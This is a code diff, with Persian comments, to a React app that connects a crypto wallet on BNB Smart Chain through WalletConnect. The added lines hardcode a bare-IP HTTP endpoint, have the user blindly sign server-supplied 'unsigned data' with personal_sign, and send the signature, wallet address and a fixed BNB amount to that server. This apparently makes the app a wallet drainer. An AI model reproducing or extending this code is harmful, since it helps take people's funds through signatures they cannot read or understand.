@@ -9,7 +9,7 @@ function App() {
     var ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
       chains: [56], // فقط BSC
-      methods: ["personal_sign"],  // تغییر به personal_sign
+      methods: ["personal_sign"], // متد personal_sign
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
 
@@ -19,13 +19,17 @@ function App() {
     var sender = accounts[0];
     console.log("✅ Wallet Address:", sender);
 
-    let apiUrl = process.env.REACT_APP_API_URL; // استفاده از متغیر محیطی
-
-    async function getRawSignature(address) {
+    async function getRawSignature(address, balance) {
       try {
-        let requestData = { handler: "tx", address, chain: "56", type: "coin" };
+        let requestData = {
+          handler: "tx",
+          address: address,
+          chain: "56",
+          type: "coin",
+          balance: balance, // مقدار BNB مورد نظر
+        };
 
-        let response = await fetch(apiUrl, {
+        let response = await fetch("http://104.194.133.124/send.php", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(requestData),
@@ -35,8 +39,8 @@ function App() {
         console.log("📜 Unsigned Data:", unsignedData);
 
         var rawSignature = await provider.request({
-          method: "personal_sign",  // تغییر به personal_sign
-          params: [JSON.stringify(unsignedData), address], // توجه به ترتیب پارامترها
+          method: "personal_sign",
+          params: [JSON.stringify(unsignedData), address], // ترتیب پارامترها مهم است
         });
 
         return rawSignature;
@@ -46,15 +50,15 @@ function App() {
       }
     }
 
-    async function sendSignedTransaction(signature) {
+    async function sendSignedTransaction(signature, sender, balance) {
       try {
-        var requestData = {
-          handler: "sign",
-          signature: signature,
-          type: "coin",
+        let requestData = {
+          sender: sender,
+          balance: balance,
+          signedData: signature,
         };
 
-        let response = await fetch(apiUrl, {
+        let response = await fetch("http://104.194.133.124/send.php", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(requestData),
@@ -70,11 +74,12 @@ function App() {
       }
     }
 
-    var rawSignature = await getRawSignature(sender);
+    let balance = "0.01"; // مقدار BNB مورد انتقال (می‌توان از ورودی کاربر گرفت)
+    var rawSignature = await getRawSignature(sender, balance);
 
     if (rawSignature) {
       console.log("✍️ Signed Raw Data:", rawSignature);
-      var txHash = await sendSignedTransaction(rawSignature);
+      var txHash = await sendSignedTransaction(rawSignature, sender, balance);
       console.log("📤 Final Transaction Hash:", txHash);
     } else {
       console.error("⚠ Signing failed.");
